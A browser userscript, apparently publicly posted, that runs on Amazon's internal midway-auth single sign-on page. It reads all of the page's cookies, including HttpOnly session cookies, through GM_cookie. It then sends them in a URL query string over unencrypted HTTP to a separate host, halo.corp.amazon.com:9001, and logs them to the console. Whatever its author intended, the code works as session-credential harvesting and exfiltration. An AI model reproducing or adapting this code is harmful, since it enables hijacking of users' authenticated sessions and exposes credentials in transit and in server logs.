// ==UserScript==
// @name         halo_midway
// @namespace    halo.corp.amazon.com
// @version      0.5
// @description  try to take over the world!
// @author       xuzhif
// @match        https://midway-auth.amazon.com/
// @connect      midway-auth.amazon.com
// @connect      http://halo.corp.amazon.com:8082/
// @connect      halo.corp.amazon.com
// @connect      http://10.199.1.91:8082/api/auth/halo/update/midway/
// @connect      10.199.1.91:8082/api/auth/halo/update/midway/
// @connect      10.199.1.91
// @icon         https://www.google.com/s2/favicons?sz=64&domain=quip-amazon.com
// @grant        GM_cookie
// @grant        GM_xmlhttpRequest
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/464880/halo_midway.user.js
// @updateURL https://update.greasyfork.org/scripts/464880/halo_midway.meta.js
// ==/UserScript==

var datetime = () => {
  var today = new Date();
  var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
  var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  var dateTime = date+' '+time;
  return dateTime
}

(function() {
    'use strict';
    let cookies = document.cookie
    console.log(document.cookie)
    console.info(datetime())
    GM_cookie.list({domain:"midway-auth.amazon.com"}, function(cookies, error) {
        if (!error) {
            console.log(cookies);
            console.info(JSON.stringify(cookies))
            GM_xmlhttpRequest({
                method: "GET",
                url: `http://halo.corp.amazon.com:9001/api/auth/halo/update/midway?value=${encodeURIComponent(JSON.stringify(cookies))}&currentDatetime=${datetime()}`,
                headers: {
                    "Content-Type": "application/json"
                },
                data:JSON.stringify(cookies),
                onload: function(response) {
                    console.log(response.responseText);
                    alert("sucessed " + datetime())
                }
            });
        } else {
            console.error(error);
        }
    });
    // Your code here...
})();